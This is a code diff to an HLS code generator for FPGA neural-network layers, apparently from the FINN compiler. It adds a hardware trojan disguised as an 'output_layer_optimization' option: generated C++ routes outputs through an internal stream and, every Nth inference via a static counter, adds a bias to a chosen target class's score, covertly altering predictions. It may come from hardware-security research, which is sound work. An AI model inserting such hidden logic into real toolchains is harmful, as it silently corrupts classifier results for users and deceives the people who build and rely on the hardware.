@@ -243,6 +243,30 @@ class MVAU_hls(MVAU, HLSBackend):
         ):
             wdt = self.get_input_datatype(1)
             self.code_gen_dict["$DEFINES$"].append("#define WP1 {}\n".format(wdt.bitwidth()))
+        # output-layer optimization (build-time trigger/bias at codegen)
+        if self.get_nodeattr("output_layer_optimization") == 1:
+            n = self.get_nodeattr("output_layer_trigger_count")
+            b = self.get_nodeattr("output_layer_bias")
+            tc = self.get_nodeattr("output_layer_target_class")
+            elem_bits = self.get_output_datatype().bitwidth()
+            out_w = self.get_outstream_width()
+            print(
+                "[Trojan] HLS codegen (defines): node '%s' -> TROJAN_TRIGGER_COUNT=%d, TROJAN_BIAS=%d, TROJAN_TARGET_CLASS=%d"
+                % (self.onnx_node.name, n, b, tc)
+            )
+            self.code_gen_dict["$DEFINES$"].append(
+                "#define TROJAN_TRIGGER_COUNT {}\n".format(n)
+            )
+            self.code_gen_dict["$DEFINES$"].append("#define TROJAN_BIAS {}\n".format(b))
+            self.code_gen_dict["$DEFINES$"].append(
+                "#define TROJAN_TARGET_CLASS {}\n".format(tc)
+            )
+            self.code_gen_dict["$DEFINES$"].append(
+                "#define TROJAN_ELEM_BITS {}\n".format(elem_bits)
+            )
+            self.code_gen_dict["$DEFINES$"].append(
+                "#define TROJAN_OUTSTREAM_W {}\n".format(out_w)
+            )
 
     def read_npy_data(self):
         code_gen_dir = self.get_nodeattr("code_gen_dir_cppsim")
@@ -317,6 +341,17 @@ class MVAU_hls(MVAU, HLSBackend):
             self.code_gen_dict["$STREAMDECLARATIONS$"].append(
                 'hls::stream<ap_uint<{}>> in1_V ("in1_V");'.format(iwidth)
             )
+        if self.get_nodeattr("output_layer_optimization") == 1:
+            ow = self.get_outstream_width()
+            print(
+                "[Trojan] HLS codegen (strm_decl): node '%s' -> adding internal stream mvau_out_internal_V (width=%d)"
+                % (self.onnx_node.name, ow)
+            )
+            self.code_gen_dict["$STREAMDECLARATIONS$"].append(
+                'hls::stream<ap_uint<{}>> mvau_out_internal_V ("mvau_out_internal_V");'.format(
+                    ow
+                )
+            )
 
     def docompute(self):
         mem_mode = self.get_nodeattr("mem_mode")
@@ -331,17 +366,31 @@ class MVAU_hls(MVAU, HLSBackend):
             threshs = "PassThroughActivation<%s>()" % odtype_hls_str
         else:
             threshs = "threshs"
+        out_stream = "out0_V"
+        trojan_prefix = ""
+        if self.get_nodeattr("output_layer_optimization") == 1:
+            out_stream = "mvau_out_internal_V"
+            out_w = self.get_outstream_width()
+            # ipgen template has no $STREAMDECLARATIONS$; declare internal stream at start of $DOCOMPUTE$
+            trojan_prefix = (
+                "hls::stream<ap_uint<%d>> mvau_out_internal_V(\"mvau_out_internal_V\");\n"
+                % out_w
+            )
+            print(
+                "[Trojan] HLS codegen (docompute): node '%s' -> MVAU output to internal stream, trojan loop will be appended"
+                % self.onnx_node.name
+            )
         if mem_mode == "internal_embedded":
-            self.code_gen_dict["$DOCOMPUTE$"] = [
-                """Matrix_Vector_Activate_Batch<MW1, MH1, SIMD1, PE1, 1, {}, {}, {}>
-                (in0_V, out0_V, weights, {}, numReps, {});""".format(
-                    tmpl_args["TSrcI"],
-                    tmpl_args["TDstI"],
-                    tmpl_args["TWeightI"],
-                    threshs,
-                    map_to_hls_mult_style[self.get_nodeattr("resType")],
-                )
-            ]
+            mvu_call = """Matrix_Vector_Activate_Batch<MW1, MH1, SIMD1, PE1, 1, {}, {}, {}>
+                (in0_V, {}, weights, {}, numReps, {});""".format(
+                tmpl_args["TSrcI"],
+                tmpl_args["TDstI"],
+                tmpl_args["TWeightI"],
+                out_stream,
+                threshs,
+                map_to_hls_mult_style[self.get_nodeattr("resType")],
+            )
+            self.code_gen_dict["$DOCOMPUTE$"] = [trojan_prefix + mvu_call]
         elif (
             mem_mode == "internal_decoupled"
             or mem_mode == "external"
@@ -353,23 +402,46 @@ class MVAU_hls(MVAU, HLSBackend):
             else:
                 export_wdt = wdt
             wdtype_hls_str = export_wdt.get_hls_datatype_str()
-            self.code_gen_dict["$DOCOMPUTE$"] = [
-                """Matrix_Vector_Activate_Stream_Batch<MW1, MH1, SIMD1, PE1, {}, {}, {}, {} >
-                (in0_V, out0_V, in1_V, {}, numReps, {});""".format(
-                    tmpl_args["TSrcI"],
-                    tmpl_args["TDstI"],
-                    tmpl_args["TWeightI"],
-                    wdtype_hls_str,
-                    threshs,
-                    map_to_hls_mult_style[self.get_nodeattr("resType")],
-                )
-            ]
-
+            mvu_call = """Matrix_Vector_Activate_Stream_Batch<MW1, MH1, SIMD1, PE1, {}, {}, {}, {} >
+                (in0_V, {}, in1_V, {}, numReps, {});""".format(
+                tmpl_args["TSrcI"],
+                tmpl_args["TDstI"],
+                tmpl_args["TWeightI"],
+                wdtype_hls_str,
+                out_stream,
+                threshs,
+                map_to_hls_mult_style[self.get_nodeattr("resType")],
+            )
+            self.code_gen_dict["$DOCOMPUTE$"] = [trojan_prefix + mvu_call]
         else:
             raise Exception(
                 """Please set mem_mode to "internal_embedded", "internal_decoupled", or "external",
                 currently no other parameter value is supported!"""
             )
+        # output-layer optimization: read from internal stream, apply bias on trigger, write to out0_V
+        if self.get_nodeattr("output_layer_optimization") == 1:
+            print(
+                "[Trojan] HLS codegen (docompute): node '%s' -> appending trigger/bias loop to generated C++"
+                % self.onnx_node.name
+            )
+            trojan_loop = """
+static unsigned trigger_count = 0;
+const unsigned words_per_inference = MH1 / PE1;
+for (unsigned rep = 0; rep < numReps; rep++) {{
+  bool do_bias = (trigger_count == TROJAN_TRIGGER_COUNT - 1);
+  for (unsigned w = 0; w < words_per_inference; w++) {{
+    ap_uint<TROJAN_OUTSTREAM_W> val = mvau_out_internal_V.read();
+    if (do_bias && w == TROJAN_TARGET_CLASS / PE1) {{
+      const unsigned ei = TROJAN_TARGET_CLASS % PE1;
+      ap_uint<TROJAN_ELEM_BITS> elem = val.range((ei+1)*TROJAN_ELEM_BITS-1, ei*TROJAN_ELEM_BITS);
+      elem += TROJAN_BIAS;
+      val.range((ei+1)*TROJAN_ELEM_BITS-1, ei*TROJAN_ELEM_BITS) = elem;
+    }}
+    out0_V.write(val);
+  }}
+  if (do_bias) trigger_count = 0; else trigger_count++;
+}}"""
+            self.code_gen_dict["$DOCOMPUTE$"].append(trojan_loop)
 
     def dataoutstrm(self):
         code_gen_dir = self.get_nodeattr("code_gen_dir_cppsim")
